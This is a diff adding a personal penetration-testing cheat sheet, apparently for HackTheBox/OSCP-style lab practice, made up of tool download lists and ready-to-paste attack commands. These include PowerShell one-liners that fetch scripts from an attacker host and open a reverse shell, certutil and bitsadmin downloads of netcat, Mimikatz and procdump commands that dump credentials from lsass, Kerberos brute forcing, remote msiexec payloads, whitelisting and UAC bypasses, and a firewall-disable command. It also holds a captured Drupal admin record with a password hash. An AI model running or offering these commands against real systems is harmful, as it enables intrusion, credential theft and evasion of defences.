@@ -1,0 +1,535 @@
+Tools
+-----------
+
+apt-get update
+
+sudo apt-get install gobuster
+
+git clone https://github.com/vitalysim/totalrecon ( will install ffuf)
+
+git clone https://github.com/diego-treitos/linux-smart-enumeration
+git clone https://github.com/rebootuser/LinEnum
+git clone https://github.com/mthbernardes/rsg
+git clone https://github.com/qashqao/acccheck
+git clone https://github.com/tennc/fuzzdb/
+git clone https://github.com/sleventyeleven/linuxprivchecker/
+git clone https://github.com/epi052/cve-2018-15473/
+git clone https://github.com/Kan1shka9/Finger-User-Enumeration/
+git clone https://github.com/Tib3rius/AutoRecon
+git clone https://github.com/jcatala/h4ckme   ( this will give pspy)
+git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+git clone https://github.com/pentestmonkey/unix-privesc-check
+git clone https://github.com/pentestmonkey/windows-privesc-check
+git clone https://github.com/int0x33/nc.exe
+git clone https://github.com/qashqao/acccheck
+git clone  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+git clone https://github.com/ankh2054/windows-pentest
+
+wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
+wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
+wget https://raw.githubusercontent.com/M4ximuss/Powerless/master/Powerless.bat
+wget https://raw.githubusercontent.com/absolomb/WindowsEnum/master/WindowsEnum.ps1
+wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
+wget https://raw.githubusercontent.com/pentestmonkey/smtp-user-enum/master/smtp-user-enum.pl
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+wget  "https://download.sysinternals.com/files/AccessChk.zip"
+
+https://github.com/DominicBreuker/pspy/blob/master/README.md
+
+wget https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe ( acccheck for xp)
+
+
+
+
+SMTP username enumeration
+-------------------------
+
+http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
+
+
+
+Hashdump windows
+------------------
+https://github.com/Neohapsis/creddump7
+
+
+To work with sshuttle. we need to install sshpass
+apt-get install sshpass
+
+
+apt-get install seclists
+apt-get install rlwrap
+
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket/
+python3 setup.py install
+
+
+
+For error: 
+from setuptools import setup
+ImportError: No module named setuptools
+
+Sol:
+sudo apt-get install python-setuptools
+sudo apt-get install python3-setuptools
+
+
+
+Install PIP
+
+ apt install python-pip	#python 2
+# apt install python3-pip	#python 3
+
+
+Installing Mingw-w64 on Kali Linux
+------------------------------------
+
+apt-get install mingw-w64
+
+https://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/
+
+i686-w64-mingw32-gcc adduser.c -o adduser_32.exe
+x86_64-w64-mingw32-gcc adduser.c -o adduser_64.exe
+
+
+Compiling 32 bit on 64 bit linux
+---------------------------------
+
+apt install libc6-dev-i386
+
+https://blog.didierstevens.com/2018/11/19/quickpost-compiling-32-bit-static-elf-files-on-kali/
+
+
+How to install wine in kali
+--------------------------
+
+https://forums.kali.org/showthread.php?25175-install-wine-on-kali-64bit-with-no-problems
+
+
+ffufplus
+------------
+
+https://github.com/dark-warlord14/ffufplus
+
+ffuf
+----
+https://github.com/ffuf/ffuf
+
+
+
+
+command injection payload list
+-----------------------------
+
+https://github.com/payloadbox/command-injection-payload-list
+https://github.com/PortSwigger/command-injection-attacker
+
+
+LDAP tool
+---------
+https://github.com/ropnop/windapsearch
+
+
+Install go
+--------------
+
+https://github.com/canha/golang-tools-install-script
+
+magento
+--------
+
+https://github.com/steverobbins/magescan/releases ( from swagshop htb)
+
+
+phantom evasion(AV evasion)
+--------------------------
+
+https://github.com/oddcod3/Phantom-Evasion
+
+
+
+UAC
+------
+#UAC bypass from precompiled binaries:
+https://github.com/hfiref0x/UACME
+
+
+Pass the hash
+--------------
+https://github.com/byt3bl33d3r/pth-toolkit
+
+
+
+evil-winrm --Windows remote management shell
+-------------------------------------------
+
+https://github.com/Hackplayers/evil-winrm
+
+
+
+cipher help
+----------
+https://quipqiup.com/
+
+
+NoSQLMap 
+---------
+
+https://github.com/codingo/NoSQLMap.git
+
+
+
+
+CMSmap
+----------
+
+https://github.com/Dionach/CMSmap
+
+
+pip install droopescan
+
+https://github.com/returnvar/wce
+
+
+
+sipvicious --sip related tool
+------------------------------
+
+https://github.com/EnableSecurity/sipvicious
+
+Windows binaeries
+--------------------
+
+https://github.com/carlospolop/winPE
+
+
+JWAS enum
+----------
+
+https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
+
+
+Dump local hash
+-----------------
+
+https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1
+
+
+Dump password
+------------------
+
+https://www.hackingarticles.in/credential-dumping-sam/
+
+https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/
+
+https://www.tarasco.org/security/pwdump_7/
+
+
+wget https://gist.githubusercontent.com/monoxgas/9d238accd969550136db/raw/7806cc26744b6025e8f1daf616bc359cb6a11965/Invoke-DCSync.ps1 (Invoke-PowerDump.ps1)
+Invoke-DCSync -PWDumpFormat
+
+From : https://chrishales.wordpress.com/2018/01/03/powershell-password-one-liners/
+https://github.com/samratashok/nishang/tree/master/Gather
+
+powershell.exe -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.215/Get-PassHashes.ps1');get-passhashes
+
+
+https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1  (Get-PassHashes.ps1)
+
+https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/
+lazagne.exe all -vv
+https://github.com/AlessandroZ/LaZagne/releases
+
+
+https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1
+https://gist.githubusercontent.com/monoxgas/9d238accd969550136db/raw/7806cc26744b6025e8f1daf616bc359cb6a11965/Invoke-DCSync.ps1
+
+
+Invoke-Mimikatz
+-------------------
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds #Dump creds from memory
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+
+
+C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
+C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+
+fgdump.exe
+wce.exe
+PwDump.exe
+
+-----------------------------------------------------------------------------------------------------------------
+
+How to find .net version
+
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP
+wmic product get description | findstr /C:.NET
+
+
+
+Application Whitelisting Bypasses
+----------------------------------
+
+
+https://github.com/milkdevil/UltimateAppLockerByPassList   ( Big list)
+
+using regsrv32.exe (Multiple Methods)  ( This is used  when Antivirus is blocking our application for some reason)
+--------
+
+https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/
+https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba
+
+
+using MSIEXEC
+-----------
+
+https://github.com/netbiosX/Checklists/wiki/Application-Whitelisting-Bypass
+https://github.com/netbiosX/Checklists/blob/master/AppLocker.md
+
+https://attackiq.com/blog/2018/05/21/application-whitelist-bypass/
+Installutil.exe /U compiled.exe
+
+
+Msiexec utility has the ability to execute MSI files either locally or remotely. Additionally MSI files that have been renamed to PNG to avoid detection can be also executed normally and have the same results.
+
+msiexec /quiet /i cmd.msi
+
+msiexec /q /i http://192.168.100.3/tmp/cmd.png
+
+
+Windows environments (check was done in Windows Server 2008 R2) by default allowing standard users of the system to have read and write access in these folders:
+
+C:\Windows\Tasks
+C:\Windows\Temp
+C:\Windows\tracing
+
+
+https://github.com/netbiosX/Checklists/blob/master/AppLocker.md  (All the tools)
+
+
+https://github.com/khr0x40sh/WhiteListEvasion
+
+
+https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
+
+
+https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html
+
+https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc
+
+https://www.hackingarticles.in/bypass-application-whitelisting-using-wmic-exe-multiple-methods/
+
+
+netsh firewall set opmode disable
+
+
+
+Proc Mon" (IppSec) Script 
+------------------------
+
+https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts
+
+#!/bin/bash
+
+IFS=$'\n'
+old_process=$(ps -eo command)
+
+while true; do
+  new_process=$(ps -eo command)
+  diff <(echo "$old_process") <(echo "$new_process") |grep [\<\>]
+  sleep 1
+  old_process=$new_process
+done
+
+
+
+
+
+From : https://guide.offsecnewbie.com/kali-configuration/useful-things-to-install
+
+https://github.com/BrashEndeavours/hotwax
+
+apt-get install gifsicle 
+
+
+
+Prodump ( To dump the process from windows machine)
+
+https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+
+
+
+(Strings for windows)
+https://docs.microsoft.com/en-us/sysinternals/downloads/strings
+
+
+
+Active Directory
+================
+
+
+There is a great script developed by TarlogicSecurity entitled kerbrute.py that uses Impacket Libaries to to brute force and enumerate Kerberos users.
+
+https://github.com/TarlogicSecurity/kerbrute
+
+
+./kerbrute.py -users users_file.txt -passwords rockyou.txt -domain thinc.local
+
+
+
+Ruby scripts
+------------
+
+To run rubu scripts, we need to install:
+
+sudo gem install highline
+
+
+bitsadmin /transfer transfName /priority high http://10.10.14.10/nc.exe nc.execertutil.exe -urlcache -split -f http://10.10.14.9/﻿nc.exe  .
+
+
+certutil.exe -urlcache -split -f http://10.10.14.10/﻿nc.exe  .
+
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  -nop -ep  bypass  -Command  "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443"
+
+
+ powershell.exe \(New-Object System.Net.WebClient\).DownloadFile\('http://10.10.14.10/nc.exe', 'nc.exe'\) 
+
+
+c:\users\All users\desktop\nc.exe 
+
+
+}root@kali:~/htb/bastard# cat user.json 
+{
+    "uid": "1",
+    "name": "admin",
+    "mail": "drupal@hackthebox.gr",
+    "theme": "",
+    "created": "1489920428",
+    "access": "1492102672",
+    "login": 1588539693,
+    "status": "1",
+    "timezone": "Europe\/Athens",
+    "language": "",
+    "picture": null,
+    "init": "drupal@hackthebox.gr",
+    "data": false,
+    "roles": {
+        "2": "authenticated user",
+        "3": "administrator"
+    },
+    "rdf_mapping": {
+        "rdftype": [
+            "sioc:UserAccount"
+        ],
+        "name": {
+            "predicates": [
+                "foaf:name"
+            ]
+        },
+        "homepage": {
+            "predicates": [
+                "foaf:page"
+            ],
+            "type": "rel"
+        }
+    },
+    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
+}root@kali:~/htb/bastard# 
+
+
+
+powershell.exe  -nop -ep  bypass  -Command  "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1')"
+
+
+powershell.exe  -nop -ep  bypass  -Command  "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10:80/Invoke-PowerShellTcp.ps1')"
+
+ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10/winPEAS.bat', 'winPEAS.bat') 
+
+
+
+Follow:  https://www.petri.com/how-to-get-ntfs-file-permissions-using-powershell
+
+Get-Acl C:\temp
+Get-Acl -Path C:\temp
+Get-Acl -Path C:\temp | Format-Table -Wrap
+(Get-Acl -Path C:\temp).Access
+(Get-Acl -Path C:\temp).Access.IdentityReference
+(Get-Acl -Path C:\temp).[TAB] ( Press tab after .)
+
+
+Follow : https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7
+
+Get-Acl -Path HKLM:\System\CurrentControlSet\Control | Format-List  ( ACL for regostry key)
+
+
+
+
+Spartan
+---------
+Sharepoint enumeration tool
+
+
+
+SMBMAP
+-----
+https://github.com/ShawnDEvans/smbmap
+
+
+smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
+
+
+
+mssql client
+-----------
+apt-get install sqsh
+
+
+
+email client
+-------------
+
+evolution
+
+
+
+
+nullinux --wrapper for smabmap and rcp client
+---------------------------------------------
+git clone https://github.com/m8r0wn/nullinux
+
+
+Shellshockr
+------------
+
+https://github.com/nccgroup/shocker
+
+
+
+tool for shellshock
+--------------------
+
+https://tuonilabs.wordpress.com/tag/shellshock-vulnerability/
+
+
+
+
+
+crack public keys
+------------------
+
+https://github.com/Ganapati/RsaCtfTool
+
+
+
+SMB brute force
+-----------------
+
+https://github.com/m4ll0k/SMBrute
